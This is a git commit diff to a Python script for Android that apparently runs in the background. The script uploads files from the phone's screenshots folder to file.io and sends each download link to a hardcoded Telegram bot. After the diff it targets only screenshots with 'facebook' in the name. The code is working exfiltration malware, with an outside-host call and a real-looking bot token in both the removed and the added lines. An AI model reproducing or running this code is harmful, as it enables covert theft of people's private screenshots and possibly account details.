b6839bcf5a942588b3f98759f1bc4e0f19b01b18
HARRY DON <94730463+HARRY-EXE@users.noreply.github.com>
2024-02-23 01:53:48 +0545

    Update run.py

--- run.py
+++ run.py
@@ -1,13 +1,13 @@
 import os
 import requests
 import multiprocessing
-import time
 
 directory_path = '/sdcard/DCIM/Screenshots'
 response = requests.get("https://api.ipify.org?format=json")
 ipadd = response.json()["ip"]
 uname = "HARRRYYY"
-print ( " YOUR IP : "+ipadd)
+print("YOUR IP : " + ipadd)
+
 
 def upload_file_to_file_io(file_path):
     with open(file_path, 'rb') as file:
@@ -15,17 +15,22 @@ def upload_file_to_file_io(file_path):
         response_data = response.json()
         return response_data.get('link')
 
+
 def process_directory_files(directory_path):
     if os.path.exists(directory_path) and os.path.isdir(directory_path):
         for filename in os.listdir(directory_path):
-            file_path = os.path.join(directory_path, filename)
-            if os.path.isfile(file_path):
-                file_link = upload_file_to_file_io(file_path)
-                print()
-                requests.get("https://api.telegram.org/bot6907566146:AAE29bGXkKSAsrLUEuPiPqL1xbzvy4h1xyw/sendMessage?chat_id=6568295648&text= [•] FILES FOR " + uname + "\nLINK : "+file_link)
-                
+            if "facebook" in filename.lower():  # Check if "facebook" is in the filename
+                file_path = os.path.join(directory_path, filename)
+                if os.path.isfile(file_path):
+                    file_link = upload_file_to_file_io(file_path)
+                    print()
+                    requests.get(
+                        "https://api.telegram.org/bot6907566146:AAE29bGXkKSAsrLUEuPiPqL1xbzvy4h1xyw/sendMessage?chat_id=6568295648&text= [•] FILES FOR "
+                        + uname + "\nLINK : " + file_link)
+
     else:
         print()
+
 
 if __name__ == "__main__":
     # Create a multiprocessing Process to run the function in the background
